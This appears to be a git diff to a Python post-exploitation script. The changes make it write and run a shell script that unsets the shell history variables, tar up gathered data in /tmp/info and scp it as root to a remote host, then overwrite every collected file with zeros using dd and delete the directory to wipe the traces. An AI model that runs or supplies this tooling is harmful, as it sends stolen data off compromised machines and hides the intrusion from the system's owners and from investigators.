@@ -85,10 +85,13 @@ def preLim():
     for i in range(0,len(everything)):
         w2File(everything[i],"final")
 
-    #result=bashCmd("unset HISTFILE",1)
-    #result=bashCmd("unset HISTSIZE",1)
-    #result=bashCmd("unset HISTFILESIZE",1)
-    #result=bashCmd("/root/Desktop/hist.sh")
+    w2File("#! /bin/sh","hist.sh",2)
+    w2File("unset HISTFILE","hist.sh",2)
+    w2File("unset HISTSIZE","hist.sh",2)
+    w2File("unset HISTFILESIZE","hist.sh",2)
+    bashCmd("chmod +x /tmp/info/hist.sh")
+    result=bashCmd("/tmp/info/hist.sh")
+    
 
 
 ##########################################
@@ -179,7 +182,7 @@ def xferFile(dfile,IPandLoc):
     # uuencode -m <file to encode>
     # ssh <IP> uuencode -m /bin/ls - | unudecode > ls
     os.chdir("/tmp/info")
-    zfile=bashCmd("tar -czvf "+dfile+".tar.gz "+dfile+" | uuencode -m")
+    zfile=bashCmd("tar -czvf "+dfile+".tar.gz "+dfile)
     #print(zfile)
     bashCmd("scp /tmp/info/"+dfile+".tar.gz root@"+IPandLoc)
 
@@ -208,19 +211,18 @@ def logClean(IPandLoc):
             print(k)
     except:
         pass
+    # xfer file
+    xferFile("final",IPandLoc)
     # find all info files
     files=bashCmd("ls /tmp/info")
     files2=files.split()
-    print()
-    # for each info file found, send to AP and zero out files
-    xferFile("final",IPandLoc)
-    # original file
-    size=bashCmd("ls -latr /tmp/info/final").split()
-    bashCmd("dd if=/dev/zero of=/tmp/info/final bs=1 count="+size[4])
-    # tar file
-    size=0
-    size=bashCmd("ls -latr /tmp/info/final.tar.gz").split()
-    bashCmd("dd if=/dev/zero of=/tmp/info/final.tar.gz bs=1 count="+size[4])
+    for i in files2:
+        # original file
+        size=bashCmd("ls -latr /tmp/info/"+i).split()
+        bashCmd("dd if=/dev/zero of=/tmp/info/"+i+" bs=1 count="+size[4])
+    #size=0
+    #size=bashCmd("ls -latr /tmp/info/final.tar.gz").split()
+    #bashCmd("dd if=/dev/zero of=/tmp/info/final.tar.gz bs=1 count="+size[4])
     bashCmd("rm -rf /tmp/info/")
 
 def getPass():
